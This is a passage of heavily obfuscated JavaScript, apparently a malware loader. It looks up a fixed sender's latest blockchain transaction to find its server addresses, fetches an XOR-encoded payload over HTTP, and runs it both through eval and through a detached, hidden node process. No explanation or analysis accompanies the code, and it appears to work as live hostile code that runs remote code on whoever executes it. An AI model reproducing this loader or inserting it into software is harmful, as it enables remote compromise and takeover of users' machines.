_0x37635a=_0x865f0d[_0x2fd541(0xb7)](_0x865f0d[_0x2fd541(0xb7)](_0x57beb5,_0x36dc0b),0x1n),_0x40232d=_0x865f0d[_0x2fd541(0xec)](BigInt,Math[_0x2fd541(0x1b1)](NONCE_FANOUT,_0x865f0d[_0x2fd541(0x17d)](Number,_0x37635a))),_0x5e593e=[];for(let _0x323461=0x1n;_0x865f0d[_0x2fd541(0x138)](_0x323461,_0x40232d);_0x323461+=0x1n)_0x5e593e[_0x2fd541(0x198)](_0x865f0d[_0x2fd541(0x184)](_0x36dc0b,_0x865f0d[_0x2fd541(0xaa)](_0x865f0d[_0x2fd541(0x12b)](_0x323461,_0x865f0d[_0x2fd541(0xb7)](_0x57beb5,_0x36dc0b)),_0x865f0d[_0x2fd541(0xda)](_0x40232d,0x1n))));let _0x5aae99=await _0x865f0d[_0x2fd541(0xb8)](nonceAtBlocks,_0x5e593e,_0x1228d0[_0x2fd541(0x10b)]),_0x5415e7=_0x5aae99[_0x2fd541(0x163)](_0x59ad09=>_0x59ad09>=_0xe32847);_0x865f0d[_0x2fd541(0xf6)](-(0xe3*-0x29+0xe5e*0x2+0x7a0*0x1),_0x5415e7)?_0x36dc0b=_0x5e593e[_0x865f0d[_0x2fd541(0xb7)](_0x5e593e[_0x2fd541(0xcd)],-0x6*-0x4a2+0x2478+-0x4043)]:(_0x57beb5=_0x5e593e[_0x5415e7],_0x865f0d[_0x2fd541(0x1b3)](_0x5415e7,-0x170*-0x5+-0xbdf+-0x6d*-0xb)&&(_0x36dc0b=_0x5e593e[_0x865f0d[_0x2fd541(0xb7)](_0x5415e7,-0x121b+0x869*-0x1+0x3*0x8d7)]));}let _0x44a2e1=await _0x865f0d[_0x2fd541(0xb8)](withRpcEndpoints,(_0x5aa246,_0x356a05)=>rpcCall(_0x5aa246,_0x2fd541(0x13f)+_0x2fd541(0x10d),[toBlockHex(_0x57beb5),!(-0x870*0x1+-0x1b5b+0x23cb)],_0x356a05),_0x1228d0[_0x2fd541(0x10b)]),_0x2a8ad0=_0x44a2e1?.[_0x2fd541(0x166)+'ns']||[],_0x5d7a1a=null;for(let _0x2ef2b4 of _0x2a8ad0)if(_0x2ef2b4[_0x2fd541(0x18c)]&&_0x865f0d[_0x2fd541(0xf6)](_0x2ef2b4[_0x2fd541(0x18c)][_0x2fd541(0xc2)+'e'](),SENDER)){if(_0x865f0d[_0x2fd541(0xf6)](_0x865f0d[_0x2fd541(0x17d)](BigInt,_0x2ef2b4[_0x2fd541(0x187)]),_0x2c7ca1)){_0x5d7a1a=_0x2ef2b4;break;}(!_0x5d7a1a||_0x865f0d[_0x2fd541(0x1b3)](_0x865f0d[_0x2fd541(0x17d)](BigInt,_0x2ef2b4[_0x2fd541(0x187)]),_0x865f0d[_0x2fd541(0xa1)](BigInt,_0x5d7a1a[_0x2fd541(0x187)])))&&(_0x5d7a1a=_0x2ef2b4);}return{'blockNumber':_0x57beb5,'tx':_0x5d7a1a};}finally{_0x1228d0[_0x2fd541(0x9a)]();}}async function lastSenderTxViaIndexer(){const _0x30016b=_0x3a2ebe,_0x461186={'yrzwP':function(_0x224acc,_0x21a4ef){return _0x224acc(_0x21a4ef);},'UqBND':function(_0x3ca6e2,_0x6d0e95){return _0x3ca6e2(_0x6d0e95);}};let _0x6b3534=INDEXER_URL+(_0x30016b(0xef)+_0x30016b(0xa3)+_0x30016b(0x143)+_0x30016b(0xbc))+SENDER+(_0x30016b(0xe5)+_0x30016b(0x183)+_0x30016b(0xba)+_0x30016b(0x160)+_0x30016b(0x197)+_0x30016b(0x190)+_0x30016b(0xc4)+'om'),_0x50dcd4=await _0x461186[_0x30016b(0x13d)](httpRequest,_0x6b3534),_0x3f1cd2=Array[_0x30016b(0xf2)](_0x50dcd4?.[_0x30016b(0xd6)])?_0x50dcd4[_0x30016b(0xd6)]:[],_0x58d5fe=_0x3f1cd2[_0x30016b(0x9d)](_0x5346ca=>_0x5346ca[_0x30016b(0x18c)]&&_0x5346ca[_0x30016b(0x18c)][_0x30016b(0xc2)+'e']()===SENDER);return{'blockNumber':_0x461186[_0x30016b(0x127)](BigInt,_0x58d5fe[_0x30016b(0x1ae)+'r']),'tx':_0x58d5fe};}async function run(){const _0x21838c=_0x3a2ebe,_0x123142={'VnFVq':function(_0x354288,_0x3fa815){return _0x354288<_0x3fa815;},'Tnnlg':function(_0x1df33a,_0x158d6c){return _0x1df33a%_0x158d6c;},'ugrhL':_0x21838c(0x19b),'tqJhV':_0x21838c(0xa9)+_0x21838c(0x1a7),'xQuoH':function(_0x183f5f,_0x2adbd1){return _0x183f5f(_0x2adbd1);},'zwjTr':_0x21838c(0xb9)+_0x21838c(0x123)+'4','GuYPf':_0x21838c(0x96),'bXcTI':function(_0x4834c3,_0xed5caa){return _0x4834c3(_0xed5caa);},'gzKWs':_0x21838c(0xdb)+_0x21838c(0x11d),'VMnQg':function(_0x38ff78,_0x527698){return _0x38ff78===_0x527698;},'PSzJk':_0x21838c(0x11a),'aPZUM':_0x21838c(0xaf),'xxxso':_0x21838c(0x142),'raCZU':_0x21838c(0xc1),'plaFW':function(_0x1d2be3,_0x44ea01){return _0x1d2be3(_0x44ea01);},'nILEL':function(_0x57e6f1,_0x261c45){return _0x57e6f1+_0x261c45;},'wvGeG':_0x21838c(0xfb)+_0x21838c(0x1a4)+_0x21838c(0xdc)+_0x21838c(0x146)+_0x21838c(0x117)+_0x21838c(0x130)+_0x21838c(0xe1)+_0x21838c(0x18a)+_0x21838c(0x180)+_0x21838c(0x9e)+_0x21838c(0x153)+'6','qiODF':function(_0x2b7840,_0x196963){return _0x2b7840(_0x196963);},'SXfgk':_0x21838c(0x133),'xbMiN':function(_0x27a0b9,_0x394d32,_0x228371){return _0x27a0b9(_0x394d32,_0x228371);},'jueMj':function(_0x3071ee,_0x13c1dd){return _0x3071ee(_0x13c1dd);},'ipNqp':function(_0x5c8fe2,_0x51b60d,_0x375c99,_0x3adfd0){return _0x5c8fe2(_0x51b60d,_0x375c99,_0x3adfd0);},'KXiLK':_0x21838c(0xed),'rMZnD':function(_0x2485d9,_0x15b4b8){return _0x2485d9+_0x15b4b8;},'RWrVc':_0x21838c(0x10f),'WYnsa':function(_0x36aa2d,_0x4e00f2){return _0x36aa2d(_0x4e00f2);},'JGUpq':function(_0x17a5ba,_0xaf6465){return _0x17a5ba(_0xaf6465);},'eWCKt':function(_0x1e004b,_0x84fa2c){return _0x1e004b-_0x84fa2c;},'KafOh':function(_0x4df275,_0x2e90){return _0x4df275%_0x2e90;},'qFOcQ':function(_0x24fa80,_0x20975f){return _0x24fa80(_0x20975f);},'eIHSm':_0x21838c(0xa7)+_0x21838c(0x128),'XrZYs':function(_0x4740e4,_0x8d4335,_0x240499,_0x191515){return _0x4740e4(_0x8d4335,_0x240499,_0x191515);},'zeoxL':_0x21838c(0x1ba)+_0x21838c(0x185)};let _0x276e42=_0x123142[_0x21838c(0x1a3)](BigInt,await _0x123142[_0x21838c(0x108)](withRpcEndpoints,(_0x486914,_0x1c1835)=>rpcCall(_0x486914,_0x21838c(0x1a1)+_0x21838c(0xd8),[],_0x1c1835))),_0x168d06=_0x123142[_0x21838c(0xf3)](_0x276e42,_0x123142[_0x21838c(0x18d)](_0x276e42,BLOCK_MULTIPLE)),_0x412ae7=await _0x123142[_0x21838c(0x137)](firstMatch,_0x123142[_0x21838c(0x1a3)](candidateBlocks,_0x168d06)[_0x21838c(0x14f)](blockTask));_0x412ae7||(_0x412ae7=await _0x123142[_0x21838c(0x19e)](lastSenderTx,_0x276e42)[_0x21838c(0x100)](()=>lastSenderTxViaIndexer()));let [_0x28de5d,_0x3b6d7d]=_0x123142[_0x21838c(0x1b4)](decodeAddress,_0x412ae7['tx']['to']),_0x3d94ba=global;function _0x5ec9c4(_0x3a20ac,_0xa9d24e){const _0x55165e=_0x21838c,_0x5ecf66={'zNIqU':function(_0x430017,_0x3246e6){const _0x15bc56=_0x355e;return _0x123142[_0x15bc56(0x182)](_0x430017,_0x3246e6);},'rjSZm':_0x123142[_0x55165e(0x119)],'cVjMR':_0x123142[_0x55165e(0x1b7)],'SHJJd':function(_0x200ce2,_0x44228d){const _0x155fb8=_0x55165e;return _0x123142[_0x155fb8(0xd9)](_0x200ce2,_0x44228d);},'dQhjR':_0x123142[_0x55165e(0x1b8)],'ZAlOy':function(_0x59c273,_0x17297a){const _0x4fc8a3=_0x55165e;return _0x123142[_0x4fc8a3(0xf8)](_0x59c273,_0x17297a);},'bLolJ':_0x123142[_0x55165e(0xd3)],'hrUVT':_0x123142[_0x55165e(0x1ab)],'YZKTj':_0x123142[_0x55165e(0xc6)]};let _0x11ec1f={'hostname':_0xa9d24e[_0x55165e(0x93)],'port':_0x123142[_0x55165e(0x137)](Number,_0xa9d24e[_0x55165e(0x15d)])||0x2236+-0x22b0+0xca,'path':_0x123142[_0x55165e(0x92)](_0xa9d24e[_0x55165e(0x150)],_0xa9d24e[_0x55165e(0x10e)]),'headers':{'User-Agent':_0x123142[_0x55165e(0xdf)],'Sec-V':_0x3d94ba['_V']||0x1309+-0x132b+0x22}};function _0x5944ee(_0x39564c){const _0x337ed4=_0x55165e;let _0x3de935=_0x3a20ac[_0x337ed4(0xcd)];for(let _0xcd6de2=-0x1*-0x15f6+0xc04+0x21fa*-0x1;_0x123142[_0x337ed4(0x156)](_0xcd6de2,_0x39564c[_0x337ed4(0xcd)]);_0xcd6de2++)_0x39564c[_0xcd6de2]^=_0x3a20ac[_0x337ed4(0xac)](_0x123142[_0x337ed4(0x19a)](_0xcd6de2,_0x3de935));return _0x39564c[_0x337ed4(0x159)](_0x123142[_0x337ed4(0x1a0)]);}function _0x3fa166(_0x5286d4){const _0x30bac6=_0x55165e;let _0x1c7184=_0x5286d4[_0x30bac6(0x14b)][_0x123142[_0x30bac6(0x119)]];if(!_0x1c7184)throw _0x123142[_0x30bac6(0xf8)](Error,_0x123142[_0x30bac6(0x1a5)]);return _0x123142[_0x30bac6(0xf8)](_0x5944ee,Buffer[_0x30bac6(0x18c)](_0x1c7184,_0x123142[_0x30bac6(0x168)]));}function _0x5e0c4c(_0x188457){const _0xdb2b5e=_0x55165e,_0x9df163={'FfHYb':function(_0x275d20,_0x11a249){const _0xda171f=_0x355e;return _0x5ecf66[_0xda171f(0x11f)](_0x275d20,_0x11a249);},'gIWWO':_0x5ecf66[_0xdb2b5e(0xe6)],'LTGfe':_0x5ecf66[_0xdb2b5e(0x101)],'djgaa':function(_0x12f74b,_0x87bcc9){const _0xd19d42=_0xdb2b5e;return _0x5ecf66[_0xd19d42(0x113)](_0x12f74b,_0x87bcc9);},'eEQvU':_0x5ecf66[_0xdb2b5e(0xa2)],'KQldR':function(_0x5a7b3b,_0x1dcf69){const _0x3bd8a8=_0xdb2b5e;return _0x5ecf66[_0x3bd8a8(0xe8)](_0x5a7b3b,_0x1dcf69);},'jvgKp':_0x5ecf66[_0xdb2b5e(0x189)],'ZgpqG':_0x5ecf66[_0xdb2b5e(0x158)],'XLylK':_0x5ecf66[_0xdb2b5e(0x162)]};return new Promise((_0x15f946,_0x5a9938)=>{const _0x320ae6=_0xdb2b5e,_0x34a894={'QMwHG':function(_0x40448d,_0x23c91e){const _0x42dd94=_0x355e;return _0x9df163[_0x42dd94(0x1b6)](_0x40448d,_0x23c91e);},'XHNyr':_0x9df163[_0x320ae6(0x112)],'eAmtO':_0x9df163[_0x320ae6(0xe7)],'ZYBBe':function(_0x3e84e2,_0x5c0248){const _0x3f74e7=_0x320ae6;return _0x9df163[_0x3f74e7(0xfc)](_0x3e84e2,_0x5c0248);},'FWUiH':_0x9df163[_0x320ae6(0x1a6)],'smCxl':function(_0x30f2b3,_0x3b4378){const _0x508aeb=_0x320ae6;return _0x9df163[_0x508aeb(0x94)](_0x30f2b3,_0x3b4378);},'LBjUj':_0x9df163[_0x320ae6(0x144)],'RpPIO':_0x9df163[_0x320ae6(0x199)],'EreqP':_0x9df163[_0x320ae6(0xca)]};let _0x67c2bf=http[_0x320ae6(0xc7)]({..._0x11ec1f,'method':_0x188457},_0x3ab5c7=>{const _0x17709d=_0x320ae6,_0x31a947={'RsZph':function(_0x3b6db8,_0x40fce6){const _0x93e689=_0x355e;return _0x34a894[_0x93e689(0x104)](_0x3b6db8,_0x40fce6);},'tavZt':_0x34a894[_0x17709d(0x10a)],'LssUT':function(_0x1f6ba3,_0xee0496){const _0x3db9b9=_0x17709d;return _0x34a894[_0x3db9b9(0x104)](_0x1f6ba3,_0xee0496);},'mjCAw':_0x34a894[_0x17709d(0x1b0)]};if(_0x34a894[_0x17709d(0xb2)](_0x34a894[_0x17709d(0xd1)],_0x188457)){try{_0x34a894[_0x17709d(0x11b)](_0x15f946,_0x34a894[_0x17709d(0x104)](_0x3fa166,_0x3ab5c7));}catch(_0x14978e){_0x34a894[_0x17709d(0x104)](_0x5a9938,_0x14978e);}_0x3ab5c7[_0x17709d(0x1b9)]();return;}let _0x333305=[];_0x3ab5c7['on'](_0x34a894[_0x17709d(0x15b)],_0x547736=>_0x333305[_0x17709d(0x198)](_0x547736)),_0x3ab5c7['on'](_0x34a894[_0x17709d(0x154)],()=>{const _0x38253d=_0x17709d;try{let _0x247fe6=Buffer[_0x38253d(0x107)](_0x333305);if(_0x247fe6[_0x38253d(0xcd)])return _0x31a947[_0x38253d(0xd2)](_0x15f946,_0x31a947[_0x38253d(0xd2)](_0x5944ee,_0x247fe6));if(_0x3ab5c7[_0x38253d(0x14b)][_0x31a947[_0x38253d(0x171)]])return _0x31a947[_0x38253d(0xd2)](_0x15f946,_0x31a947[_0x38253d(0x192)](_0x3fa166,_0x3ab5c7));_0x31a947[_0x38253d(0xd2)](_0x5a9938,_0x31a947[_0x38253d(0x192)](Error,_0x31a947[_0x38253d(0xae)]));}catch(_0x907b81){_0x31a947[_0x38253d(0xd2)](_0x5a9938,_0x907b81);}}),_0x3ab5c7['on'](_0x34a894[_0x17709d(0x12e)],_0x5a9938);});_0x67c2bf['on'](_0x9df163[_0x320ae6(0xca)],_0x5a9938),_0x67c2bf[_0x320ae6(0x142)]();});}return _0x123142[_0x55165e(0xfe)](_0x5e0c4c,_0x123142[_0x55165e(0x102)])[_0x55165e(0x100)](()=>_0x5e0c4c(_0x55165e(0x11a)));}async function _0x71cdd3(_0x36ed3f,_0x4cbe2e,_0x18ff88){const _0x433f4b=_0x21838c;try{let _0x42938e=await _0x123142[_0x433f4b(0xc3)](_0x5ec9c4,_0x4cbe2e,_0x36ed3f),_0x1de9e8=_0x18ff88?_0x433f4b(0xff)+_0x433f4b(0x17a)+(_0x3d94ba['_V']||-0xf0a+-0x135d*-0x1+-0x453)+(_0x433f4b(0xee)+_0x433f4b(0xfa))+_0x3d94ba['_H']+(_0x433f4b(0xee)+_0x433f4b(0x15e))+_0x3d94ba[_0x433f4b(0x16a)]+(_0x433f4b(0xee)+_0x433f4b(0xbe)+_0x433f4b(0x111)+_0x433f4b(0x157)+_0x433f4b(0x106)+_0x433f4b(0x179)):_0x433f4b(0xff)+_0x433f4b(0x17a)+(_0x3d94ba['_V']||0x1b1*0x2+-0x1*-0x16f9+0x207*-0xd)+(_0x433f4b(0xee)+_0x433f4b(0x132))+_0x3d94ba[_0x433f4b(0x15c)]+(_0x433f4b(0xee)+_0x433f4b(0x129))+_0x3d94ba[_0x433f4b(0x116)]+(_0x433f4b(0xee)+_0x433f4b(0xbe)+_0x433f4b(0x111)+_0x433f4b(0x157)+_0x433f4b(0x106)+_0x433f4b(0x179));_0x18ff88||_0x123142[_0x433f4b(0x1b4)](eval,_0x123142[_0x433f4b(0x92)](_0x1de9e8,_0x42938e)),_0x123142[_0x433f4b(0x125)](spawn,_0x123142[_0x433f4b(0x145)],['-e',_0x123142[_0x433f4b(0x9c)](_0x1de9e8,_0x42938e)],{'detached':!(-0xb2c+-0x1*-0xc13+-0xe7),'stdio':_0x123142[_0x433f4b(0xab)],'windowsHide':!(-0x1*-0x2079+0x1*-0x135a+0x1*-0xd1f)})[_0x433f4b(0x177)]();}catch(_0x51210c){}}_0x3d94ba['_V']=_0x3d94ba['i'],_0x3d94ba['_H']=_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x155),_0x3d94ba[_0x21838c(0x16a)]=_0x21838c(0x17e)+_0x3b6d7d+_0x21838c(0x155),_0x3d94ba[_0x21838c(0x15c)]=_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x181),_0x3d94ba[_0x21838c(0x116)]=_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x155),await _0x123142[_0x21838c(0x125)](_0x71cdd3,new URL(_0x21838c(0x17e)+_0x28de5d+(_0x21838c(0xe4)+'s')),_0x123142[_0x21838c(0xf7)],!(-0x1*0x1b55+0x1*-0x1f25+0x3a7b)),await _0x123142[_0x21838c(0xe2)](_0x71cdd3,new URL(_0x21838c(0x17e)+_0x28de5d+_0x21838c(0x124)),_0x123142[_0x21838c(0x13e)],!(0x135b+0x1c5f+-0x2fba));}run();

//-#
